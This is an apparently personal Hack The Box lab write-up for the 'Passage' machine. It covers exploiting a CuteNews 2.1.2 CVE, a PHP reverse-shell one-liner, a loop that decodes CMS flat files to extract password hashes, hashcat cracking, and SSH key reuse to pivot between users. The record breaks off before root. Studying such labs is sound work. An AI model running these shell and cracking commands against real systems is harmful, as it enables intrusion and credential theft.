---
description: https://app.hackthebox.com/machines/Passage
---

# 🚒 Passage

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We find 2 TCP ports open:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (3).png" alt=""><figcaption></figcaption></figure>

On the web page we see the follwoing information ->

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Fail 2 ban is an anti brute force software:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So basically with a gobuster I got my IP banned so i'm going to be cautious when it comes to finding subdirectories

through enumeration, i find that it's CuteNews 2.1.2 running with a known CVE ->

{% embed url="https://www.exploit-db.com/exploits/48800" %}

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Very straightforward CVE

We see some PHP files&#x20;

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So with a quick PHP reverse shell ->

```
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We get a more stable shell

after enumerating a bit, we find where is stored the flat files that are used by cuteCMS as a "database"

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

so we see this is base64 encoded:

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After looking up a write-up to see how a pro would go quick to go through all of this, i found this crazy one-liner that got me thinking i should start learning those:

```
for f in *; do cat $f | grep -v 'php die'; echo; done | grep . | while read line; do echo $line | base64 -d; echo; done | grep '"pass"'
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**explanation:**

1.  **Loop Over Files**:

    ```sh
    for f in *; do
    ```

    This loop iterates over all files in the current directory (using `*` to match all filenames).
2.  **Process Each File**:

    ```sh
    cat $f | grep -v 'php die'; echo;
    ```

    For each file, it:

    * Uses `cat $f` to read the content of the file.
    * Pipes the content to `grep -v 'php die'`, which filters out any lines containing the string `'php die'`.
    * Uses `echo` to add a newline after processing each file.
3.  **Concatenate and Filter Non-Empty Lines**:

    ```sh
    done | grep . |
    ```

    After processing all files, `done` ends the loop. The output is then piped to `grep .`, which filters out any empty lines (only lines containing at least one character are kept).
4.  **Read and Decode Each Line**:

    ```sh
    while read line; do echo $line | base64 -d; echo; done |
    ```

    This `while` loop reads each non-empty line:

    * `read line` reads a line into the variable `line`.
    * `echo $line | base64 -d` decodes the line from base64 encoding.
    * `echo` adds a newline after each decoded line.

Since we looked at the home directory and saw a paul user, we could guess that this user is the pivoting path, so i added a grep "paul" to the oneliner as a part of contribution

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

took this hash and looked it up and saw it was mode 1400 on hashcat ->

```
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I could not change user with my low interaction shell so i did a tty upgrade ->

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and we connect&#x20;

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We quickly find an ssh authorization key:

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We copy the id\_rsa key and connect to nadav user ->

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We'll get root tomorrow&#x20;
